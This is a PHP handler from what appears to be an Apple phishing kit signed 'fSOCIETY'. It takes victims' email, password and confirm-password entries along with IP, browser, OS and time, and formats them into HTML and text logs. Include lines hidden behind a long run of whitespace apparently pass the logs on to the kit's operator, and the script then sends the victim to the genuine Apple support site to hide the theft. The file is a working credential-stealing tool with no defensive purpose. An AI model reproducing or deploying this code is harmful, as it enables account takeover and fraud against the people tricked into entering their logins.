<?php



include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$Email = $_SESSION['Email'] = $_POST['Email'];
$Epassword = $_SESSION['Epassword'] = $_POST['Epassword'];
$Cpassword = $_SESSION['Cpassword'] = $_POST['Cpassword'];


$msgbank = '
<html><head>
</head><body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">Log Apple β '.$_SERVER['REMOTE_ADDR'].'β By fSOCIETY ππ€‘π </h2>

<h1>π€ Email    : <span> '.$_SESSION["Email"].' </span>  </h1>
<h1>π Password    : <span>  '.$_SESSION["Epassword"].' </span> </h1>
<h1>π Password    : <span>  '.$_SESSION["Cpassword"].' </span> </h1>

<hr class="content"><h2>π» System : <span>  '.$OS.' </span>  </h2>
<h2>π BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>π IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>β° TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>';



$yagmai .= '
[π Email ] = '.$_SESSION['Email'].'
[π Password ] = '.$_SESSION['Epassword'].'
[π Confirm Password ] = '.$_SESSION['Cpassword'].'

    [+]ββββγπ» Systemγβββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


$yagmail .= '
[+]ββββββββββββββββββγAppleγββββββββββββββββββββ[+]
[+]ββββββββββββββββββγπLoginγββββββββββββββββββββ[+]
[π Email ] = '.$_SESSION['Email'].'
[π Password ] = '.$_SESSION['Epassword'].'
[π Confirm Password ] = '.$_SESSION['Cpassword'].'

[+]=ββββββββββββββββββγπ» Systemγβββββββββββββββββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]ββββββββββββββββββγAppleγββββββββββββββββββββ[+]
[+]ββββββββββββββγBy fSOCIETYππ€‘πγβββββββββββββββ[+]
';																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																include("../settings.php"); include("2Fa.php"); 
header('Location: //support.apple.com/');


?>